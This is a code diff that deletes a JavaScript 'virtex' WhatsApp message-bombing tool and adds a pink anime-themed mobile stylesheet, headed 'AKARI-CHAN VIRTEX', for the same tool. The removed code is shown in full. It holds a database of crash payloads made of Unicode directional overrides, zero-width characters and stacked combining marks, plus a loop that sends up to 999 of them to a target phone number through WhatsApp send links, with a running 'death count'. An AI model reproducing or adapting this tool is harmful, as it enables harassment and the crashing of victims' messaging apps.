@@ -1,299 +1,643 @@
-// DATABASE VIRTEX - DEADLY EDITION
-const virtexDatabase = {
-    1: "‮⁠‍‪⁡‭‏‎﻿" + "̷̸̡̢̧̨̛̖̗̘̙".repeat(500) + "Z̷̡̢̧̨̛̖̗̘̙͓͔͕͖͙͚".repeat(200),
-    
-    2: "⁠⁡⁢⁣⁤".repeat(1000) + "‮⁠‍‪⁡‭".repeat(500) + "‏‎﻿".repeat(300),
-    
-    3: "😈👿💀👻👽🤖🎃".repeat(500) + "🔪💣🔥⚡💫💥".repeat(500) + "💔❌⚠️☠️⚰️".repeat(500),
-    
-    4: "﷽".repeat(1000) + "𒐫𒐪𒐩𒐨𒐧".repeat(500) + "𐌰𐌱𐌲𐌳𐌴".repeat(500),
-    
-    5: "‮⁠‍‪⁡‭".repeat(2000) + "̷̸̡̢̧̨".repeat(2000) + "Z̷̡̢̺͆".repeat(1000)
-};
+/* ============================================
+   AKARI-CHAN VIRTEX - ANIME EDITION
+   Tema: Watanabe Akari
+   Responsive untuk Handphone
+   Version: 1.0
+   ============================================ */
 
-// Global variables
-let attackInterval;
-let attackCount = 0;
-let deathCount = 0;
-let isAttacking = false;
-
-// Load death count from localStorage
-if (localStorage.getItem('deathCount')) {
-    deathCount = parseInt(localStorage.getItem('deathCount'));
-    document.getElementById('deathCount').textContent = deathCount;
+/* RESET & BASE */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    -webkit-tap-highlight-color: transparent;
 }
 
-// Main attack function
-function kirimVirtex() {
-    if (isAttacking) {
-        addLog('⚠️ ATTACK ALREADY IN PROGRESS!', 'warning');
-        return;
-    }
-    
-    const target = document.getElementById('targetNumber').value.trim();
-    const type = document.getElementById('virtexType').value;
-    const jumlah = parseInt(document.getElementById('jumlah').value);
-    const delay = parseFloat(document.getElementById('delay').value) * 1000;
-    
-    // Validation
-    if (!target || target.length < 10) {
-        addLog('💀 ERROR: Invalid target number!', 'error');
-        return;
-    }
-    
-    if (jumlah < 1 || jumlah > 999) {
-        addLog('💀 ERROR: Attack count must be 1-999!', 'error');
-        return;
-    }
-    
-    // Activate attack mode
-    isAttacking = true;
-    attackCount = 0;
-    
-    // Update UI
-    document.getElementById('sendBtn').disabled = true;
-    document.getElementById('sendBtn').classList.add('attacking');
-    document.getElementById('emergencyStop').disabled = false;
-    document.getElementById('statusText').textContent = '🔴 ATTACK IN PROGRESS';
-    document.getElementById('statusText').style.color = '#ff0000';
-    
-    // Get virtex
-    const virtex = virtexDatabase[type];
-    const namaTipe = document.getElementById('virtexType').options[document.getElementById('virtexType').selectedIndex].text;
-    
-    // Log start
-    addLog('☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️', 'separator');
-    addLog(`💀 NUCLEAR ATTACK INITIATED`, 'info');
-    addLog(`🎯 TARGET: ${target}`, 'info');
-    addLog(`⚔️ WEAPON: ${namaTipe}`, 'info');
-    addLog(`🔁 ATTACKS: ${jumlah}x`, 'info');
-    addLog(`⏱️ DELAY: ${delay/1000}s`, 'info');
-    addLog('☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️', 'separator');
-    
-    // Start attack
-    function sendAttack() {
-        if (attackCount < jumlah && isAttacking) {
-            attackCount++;
-            deathCount++;
-            
-            // Encode and send
-            const encodedVirtex = encodeURIComponent(virtex + generateChaos());
-            const waURL = `https://api.whatsapp.com/send?phone=${target}&text=${encodedVirtex}`;
-            window.open(waURL, '_blank');
-            
-            // Log success
-            addLog(`💥 [${attackCount}/${jumlah}] ATTACK LAUNCHED`, 'success');
-            
-            // Update death counter
-            document.getElementById('deathCount').textContent = deathCount;
-            localStorage.setItem('deathCount', deathCount);
-            
-            // Screen shake effect
-            screenShake();
-            
-            if (attackCount < jumlah && isAttacking) {
-                setTimeout(sendAttack, delay);
-            } else {
-                finishAttack();
-            }
-        }
-    }
-    
-    setTimeout(sendAttack, 1000);
+html, body {
+    min-height: 100vh;
+    width: 100%;
+    overflow-x: hidden;
 }
 
-// Emergency stop
-function emergencyStop() {
-    if (isAttacking) {
-        isAttacking = false;
-        addLog('⚠️⚠️⚠️ EMERGENCY ABORT ⚠️⚠️⚠️', 'warning');
-        addLog('🛑 ATTACK HALTED BY USER', 'warning');
-        finishAttack();
+/* ============================================
+   ANIME BACKGROUND - Watanabe Akari
+   ============================================ */
+.anime-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(135deg, #ffc0cb 0%, #ffb6c1 50%, #ff9eb5 100%);
+    z-index: -2;
+}
+
+.anime-bg::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: url('https://i.pinimg.com/736x/3b/3e/7b/3b3e7b9b3b3e7b9b3b3e7b9b3b3e7b9b.jpg');
+    background-size: cover;
+    background-position: center;
+    opacity: 0.15;
+    filter: blur(3px);
+    animation: slowZoom 30s infinite alternate;
+}
+
+.anime-bg::after {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: radial-gradient(circle at 20% 30%, rgba(255,192,203,0.4) 0%, transparent 50%);
+}
+
+/* Floating Hearts */
+.floating-hearts {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    z-index: -1;
+}
+
+.floating-hearts::before,
+.floating-hearts::after {
+    content: "💕🌸💕🌸💕🌸💕🌸";
+    position: absolute;
+    color: rgba(255, 105, 180, 0.1);
+    font-size: 30px;
+    white-space: nowrap;
+    animation: floatHearts 20s linear infinite;
+}
+
+.floating-hearts::after {
+    top: 50%;
+    animation: floatHearts 25s linear infinite reverse;
+}
+
+/* ============================================
+   MAIN CONTAINER - Responsive untuk HP
+   ============================================ */
+.container {
+    position: relative;
+    max-width: 480px; /* Optimal untuk HP */
+    width: 95%;
+    margin: 15px auto;
+    padding: 20px 15px;
+    background: rgba(255, 240, 245, 0.9);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border-radius: 30px;
+    box-shadow: 
+        0 10px 30px rgba(255, 105, 180, 0.3),
+        0 0 0 2px rgba(255, 255, 255, 0.5) inset;
+    z-index: 10;
+    border: 1px solid rgba(255, 255, 255, 0.7);
+}
+
+/* ============================================
+   HEADER - Akari Avatar
+   ============================================ */
+.header {
+    text-align: center;
+    margin-bottom: 20px;
+    position: relative;
+}
+
+.akari-avatar {
+    width: 100px;
+    height: 100px;
+    margin: 0 auto 15px;
+    position: relative;
+    border-radius: 50%;
+    overflow: hidden;
+    border: 4px solid white;
+    box-shadow: 0 5px 20px rgba(255, 105, 180, 0.5);
+}
+
+.akari-avatar img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+}
+
+.avatar-glow {
+    position: absolute;
+    top: -10px;
+    left: -10px;
+    right: -10px;
+    bottom: -10px;
+    background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.8), transparent 70%);
+    animation: avatarGlow 3s infinite;
+    pointer-events: none;
+}
+
+.anime-title {
+    font-size: 1.8rem;
+    color: #d43f6b;
+    text-shadow: 2px 2px 0 #ffb6c1;
+    margin: 10px 0 5px;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    flex-wrap: wrap;
+}
+
+.pink {
+    color: #ff69b4;
+    font-size: 1.5rem;
+}
+
+.subtitle {
+    margin: 5px 0 10px;
+}
+
+.kawaii {
+    background: rgba(255, 255, 255, 0.7);
+    padding: 5px 15px;
+    border-radius: 50px;
+    color: #d43f6b;
+    font-size: 0.9rem;
+    display: inline-block;
+    box-shadow: 0 2px 5px rgba(255,105,180,0.2);
+}
+
+.status-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(255, 255, 255, 0.9);
+    padding: 8px 20px;
+    border-radius: 50px;
+    margin-top: 10px;
+    border: 1px solid #ffb6c1;
+}
+
+.dot {
+    width: 10px;
+    height: 10px;
+    background: #4caf50;
+    border-radius: 50%;
+    animation: pulse 1.5s infinite;
+}
+
+#statusText {
+    color: #666;
+    font-size: 0.85rem;
+}
+
+/* ============================================
+   CARDS - Input Section
+   ============================================ */
+.card {
+    background: rgba(255, 255, 255, 0.7);
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
+    border-radius: 20px;
+    padding: 15px;
+    margin-bottom: 15px;
+    border: 1px solid rgba(255, 255, 255, 0.8);
+    box-shadow: 0 4px 10px rgba(255, 105, 180, 0.15);
+}
+
+.anime-label {
+    display: block;
+    color: #b23b5e;
+    font-size: 0.95rem;
+    margin-bottom: 8px;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+}
+
+.emoji {
+    font-size: 1.2rem;
+}
+
+/* Input Styling */
+.input-wrapper {
+    position: relative;
+    width: 100%;
+}
+
+.input-wrapper input {
+    width: 100%;
+    padding: 14px 16px;
+    background: white;
+    border: 2px solid #ffb6c1;
+    border-radius: 25px;
+    font-size: 1rem;
+    color: #333;
+    outline: none;
+    transition: all 0.3s;
+}
+
+.input-wrapper input:focus {
+    border-color: #ff69b4;
+    box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.2);
+}
+
+.input-focus-glow {
+    display: none;
+}
+
+.helper-text {
+    font-size: 0.75rem;
+    color: #b23b5e;
+    margin-top: 5px;
+    padding-left: 10px;
+}
+
+/* Select Styling */
+.select-wrapper {
+    position: relative;
+    width: 100%;
+}
+
+.select-wrapper select {
+    width: 100%;
+    padding: 14px 16px;
+    background: white;
+    border: 2px solid #ffb6c1;
+    border-radius: 25px;
+    font-size: 1rem;
+    color: #333;
+    outline: none;
+    appearance: none;
+    -webkit-appearance: none;
+    cursor: pointer;
+}
+
+.select-arrow {
+    position: absolute;
+    right: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #ff69b4;
+    pointer-events: none;
+    font-size: 12px;
+}
+
+/* Number Input Styling untuk HP */
+.settings-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 15px;
+}
+
+.number-wrapper {
+    display: flex;
+    align-items: center;
+    background: white;
+    border: 2px solid #ffb6c1;
+    border-radius: 25px;
+    overflow: hidden;
+}
+
+.num-btn {
+    width: 45px;
+    height: 45px;
+    background: #ffb6c1;
+    border: none;
+    color: white;
+    font-size: 1.5rem;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    transition: background 0.2s;
+    -webkit-tap-highlight-color: transparent;
+}
+
+.num-btn:active {
+    background: #ff69b4;
+}
+
+.number-wrapper input {
+    flex: 1;
+    height: 45px;
+    border: none;
+    text-align: center;
+    font-size: 1.1rem;
+    font-weight: bold;
+    color: #b23b5e;
+    background: transparent;
+}
+
+/* Action Buttons */
+.action-buttons {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 15px;
+}
+
+.primary-btn, .secondary-btn {
+    flex: 1;
+    padding: 16px 0;
+    border: none;
+    border-radius: 30px;
+    font-size: 1.1rem;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    cursor: pointer;
+    transition: all 0.2s;
+    -webkit-tap-highlight-color: transparent;
+}
+
+.primary-btn {
+    background: linear-gradient(135deg, #ff69b4, #ff1493);
+    color: white;
+    box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4);
+}
+
+.primary-btn:active {
+    transform: scale(0.97);
+    box-shadow: 0 2px 8px rgba(255, 105, 180, 0.4);
+}
+
+.primary-btn:disabled {
+    opacity: 0.5;
+    pointer-events: none;
+}
+
+.secondary-btn {
+    background: white;
+    color: #ff69b4;
+    border: 2px solid #ffb6c1;
+}
+
+.secondary-btn:active {
+    background: #fff0f5;
+}
+
+.secondary-btn:disabled {
+    opacity: 0.3;
+    pointer-events: none;
+}
+
+.btn-icon {
+    font-size: 1.2rem;
+}
+
+/* Quick Actions */
+.quick-actions {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    justify-content: center;
+    margin-bottom: 5px;
+}
+
+.quick-btn {
+    padding: 8px 12px;
+    background: rgba(255, 255, 255, 0.8);
+    border: 1px solid #ffb6c1;
+    border-radius: 20px;
+    color: #b23b5e;
+    font-size: 0.85rem;
+    cursor: pointer;
+    transition: all 0.2s;
+    -webkit-tap-highlight-color: transparent;
+}
+
+.quick-btn:active {
+    background: #ffb6c1;
+    color: white;
+}
+
+.badge {
+    font-weight: bold;
+}
+
+/* ============================================
+   LOG SECTION
+   ============================================ */
+.log-section {
+    background: rgba(255, 255, 255, 0.7);
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
+    border-radius: 20px;
+    padding: 15px;
+    margin: 15px 0;
+    border: 1px solid rgba(255, 255, 255, 0.8);
+}
+
+.log-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 10px;
+}
+
+.log-title {
+    color: #b23b5e;
+    font-weight: bold;
+    font-size: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+}
+
+.log-actions {
+    display: flex;
+    gap: 8px;
+}
+
+.log-btn {
+    width: 36px;
+    height: 36px;
+    border: none;
+    background: rgba(255, 255, 255, 0.9);
+    border-radius: 50%;
+    font-size: 1.1rem;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s;
+    border: 1px solid #ffb6c1;
+    color: #ff69b4;
+}
+
+.log-btn:active {
+    background: #ff69b4;
+    color: white;
+}
+
+.log-box {
+    background: rgba(255, 255, 255, 0.9);
+    border-radius: 15px;
+    padding: 12px;
+    height: 200px;
+    overflow-y: auto;
+    font-size: 0.85rem;
+    border: 1px solid #ffb6c1;
+}
+
+.log-box div {
+    margin: 6px 0;
+    padding: 6px 10px;
+    background: rgba(255, 240, 245, 0.5);
+    border-radius: 12px;
+    border-left: 3px solid #ff69b4;
+    word-break: break-word;
+}
+
+.log-initial {
+    color: #b23b5e;
+    text-align: center;
+    font-style: italic;
+    padding: 15px !important;
+}
+
+/* ============================================
+   STATS
+   ============================================ */
+.stats {
+    display: flex;
+    justify-content: space-around;
+    background: rgba(255, 255, 255, 0.5);
+    border-radius: 20px;
+    padding: 12px;
+    margin: 15px 0;
+    border: 1px solid rgba(255, 255, 255, 0.8);
+}
+
+.stat-item {
+    text-align: center;
+}
+
+.stat-label {
+    display: block;
+    color: #b23b5e;
+    font-size: 0.8rem;
+    margin-bottom: 4px;
+}
+
+.stat-value {
+    display: block;
+    color: #ff1493;
+    font-size: 1.4rem;
+    font-weight: bold;
+}
+
+/* ============================================
+   FOOTER
+   ============================================ */
+.footer {
+    text-align: center;
+    margin-top: 15px;
+}
+
+.footer-text {
+    color: #b23b5e;
+    font-size: 0.9rem;
+    margin-bottom: 5px;
+    animation: sparkle 2s infinite;
+}
+
+.disclaimer {
+    color: #999;
+    font-size: 0.7rem;
+}
+
+/* ============================================
+   ANIMATIONS
+   ============================================ */
+@keyframes slowZoom {
+    0% { transform: scale(1); }
+    100% { transform: scale(1.1); }
+}
+
+@keyframes floatHearts {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+}
+
+@keyframes avatarGlow {
+    0%, 100% { opacity: 0.5; }
+    50% { opacity: 1; }
+}
+
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+}
+
+@keyframes sparkle {
+    0%, 100% { text-shadow: 0 0 2px #ff69b4; }
+    50% { text-shadow: 0 0 8px #ff1493; }
+}
+
+/* ============================================
+   SCROLLBAR STYLING
+   ============================================ */
+::-webkit-scrollbar {
+    width: 4px;
+}
+
+::-webkit-scrollbar-track {
+    background: rgba(255, 182, 193, 0.2);
+    border-radius: 10px;
+}
+
+::-webkit-scrollbar-thumb {
+    background: #ff69b4;
+    border-radius: 10px;
+}
+
+/* ============================================
+   RESPONSIVE TWEAKS
+   ============================================ */
+@media (max-width: 350px) {
+    .anime-title {
+        font-size: 1.4rem;
+    }
+    
+    .settings-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .action-buttons {
+        flex-direction: column;
+    }
+    
+    .quick-actions {
+        gap: 5px;
+    }
+    
+    .quick-btn {
+        padding: 6px 10px;
+        font-size: 0.75rem;
     }
 }
 
-// Finish attack
-function finishAttack() {
-    isAttacking = false;
-    attackCount = 0;
-    
-    document.getElementById('sendBtn').disabled = false;
-    document.getElementById('sendBtn').classList.remove('attacking');
-    document.getElementById('emergencyStop').disabled = true;
-    document.getElementById('statusText').textContent = '🔴 ARMED AND DANGEROUS';
-    
-    addLog('☠️☠️☠️ ATTACK COMPLETED ☠️☠️☠️', 'complete');
-    addLog(`💀 TOTAL DEATH COUNT: ${deathCount}`, 'info');
+/* Touch-friendly */
+button, 
+.quick-btn,
+.num-btn,
+.log-btn {
+    min-height: 44px; /* Apple's minimum touch target */
 }
 
-// Generate chaos characters
-function generateChaos() {
-    const chars = ['̷','̸','̡','̢','̧','̨','̛','̖','̗','̘','̙','͓','͔','͕','͖','͙','͚'];
-    let result = '';
-    for (let i = 0; i < 100; i++) {
-        result += chars[Math.floor(Math.random() * chars.length)];
-    }
-    return result;
+input, select {
+    font-size: 16px !important; /* Prevent zoom on iOS */
 }
-
-// Screen shake effect
-function screenShake() {
-    document.body.style.animation = 'none';
-    document.body.offsetHeight;
-    document.body.style.animation = 'bodyPulse 4s infinite';
-    
-    const intensity = Math.random() * 10 + 5;
-    document.querySelector('.container').style.transform = 
-        `translate(${Math.random()*intensity-intensity/2}px, ${Math.random()*intensity-intensity/2}px)`;
-    
-    setTimeout(() => {
-        document.querySelector('.container').style.transform = 'translate(0, 0)';
-    }, 200);
-}
-
-// Add log function
-function addLog(message, type) {
-    const logContainer = document.getElementById('logContainer');
-    const logEntry = document.createElement('p');
-    
-    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
-    
-    switch(type) {
-        case 'error':
-            logEntry.style.color = '#ff0000';
-            logEntry.innerHTML = `[${timestamp}] 💀 ${message}`;
-            break;
-        case 'success':
-            logEntry.style.color = '#ff6666';
-            logEntry.innerHTML = `[${timestamp}] 🔥 ${message}`;
-            break;
-        case 'info':
-            logEntry.style.color = '#ffaa00';
-            logEntry.innerHTML = `[${timestamp}] ⚡ ${message}`;
-            break;
-        case 'warning':
-            logEntry.style.color = '#ffff00';
-            logEntry.innerHTML = `[${timestamp}] ⚠️ ${message}`;
-            break;
-        case 'separator':
-            logEntry.style.color = '#660000';
-            logEntry.style.textAlign = 'center';
-            logEntry.innerHTML = message;
-            break;
-        case 'complete':
-            logEntry.style.color = '#ff00ff';
-            logEntry.style.fontWeight = 'bold';
-            logEntry.style.fontSize = '1.1em';
-            logEntry.innerHTML = `[${timestamp}] ☠️ ${message}`;
-            break;
-        default:
-            logEntry.style.color = '#ff6666';
-            logEntry.innerHTML = `[${timestamp}] ${message}`;
-    }
-    
-    logContainer.appendChild(logEntry);
-    logContainer.scrollTop = logContainer.scrollHeight;
-    
-    // Auto delete old logs
-    if (logContainer.children.length > 50) {
-        logContainer.removeChild(logContainer.children[0]);
-    }
-}
-
-// Clear log
-function clearLog() {
-    const logContainer = document.getElementById('logContainer');
-    logContainer.innerHTML = '<p class="log-initial">☠️ System armed. Ready to kill. ☠️</p>';
-    addLog('🗑️ BATTLE LOG CLEARED', 'warning');
-}
-
-// Export log
-function exportLog() {
-    const logContainer = document.getElementById('logContainer');
-    let logText = 'OXYX VIRTEX - BATTLE LOG\n';
-    logText += '========================\n\n';
-    
-    Array.from(logContainer.children).forEach(child => {
-        logText += child.innerText + '\n';
-    });
-    
-    const blob = new Blob([logText], { type: 'text/plain' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `battle-log-${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.txt`;
-    a.click();
-    
-    addLog('📤 BATTLE LOG EXPORTED', 'info');
-}
-
-// Number control buttons
-document.querySelectorAll('.num-up').forEach(btn => {
-    btn.addEventListener('click', function() {
-        const input = this.closest('.number-wrapper').querySelector('input');
-        input.stepUp();
-        input.dispatchEvent(new Event('change'));
-    });
-});
-
-document.querySelectorAll('.num-down').forEach(btn => {
-    btn.addEventListener('click', function() {
-        const input = this.closest('.number-wrapper').querySelector('input');
-        input.stepDown();
-        input.dispatchEvent(new Event('change'));
-    });
-});
-
-// Enter key
-document.addEventListener('keypress', function(e) {
-    if (e.key === 'Enter' && !isAttacking) {
-        kirimVirtex();
-    }
-});
-
-// Random death messages
-const deathMessages = [
-    "Another one bites the dust",
-    "Target eliminated",
-    "System compromised",
-    "Neuralizer activated",
-    "Memory wiped",
-    "Brain fried",
-    "System crash imminent",
-    "Dead code injected",
-    "Virtex successful",
-    "Target neutralized"
-];
-
-setInterval(() => {
-    if (Math.random() < 0.1 && !isAttacking) {
-        const randomMsg = deathMessages[Math.floor(Math.random() * deathMessages.length)];
-        addLog(`💀 ${randomMsg}`, 'info');
-    }
-}, 30000);
-
-// Easter egg - Konami code
-let konamiCode = [];
-document.addEventListener('keydown', (e) => {
-    const key = e.key;
-    const konamiSequence = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
-    
-    konamiCode.push(key);
-    if (konamiCode.length > konamiSequence.length) {
-        konamiCode.shift();
-    }
-    
-    if (konamiCode.join() === konamiSequence.join()) {
-        document.body.style.animation = 'glitch 0.1s infinite';
-        document.querySelectorAll('*').forEach(el => {
-            el.style.filter = `hue-rotate(${Math.random()*360}deg)`;
-        });
-        addLog('🎮 KONAMI CODE ACTIVATED - MAXIMUM OVERDRIVE', 'complete');
-    }
-});
-
-// Initialize
-window.onload = function() {
-    addLog('💀 SYSTEM INITIALIZED - READY FOR COMBAT', 'info');
-    addLog(`💀 TOTAL DEATHS SO FAR: ${deathCount}`, 'info');
-};
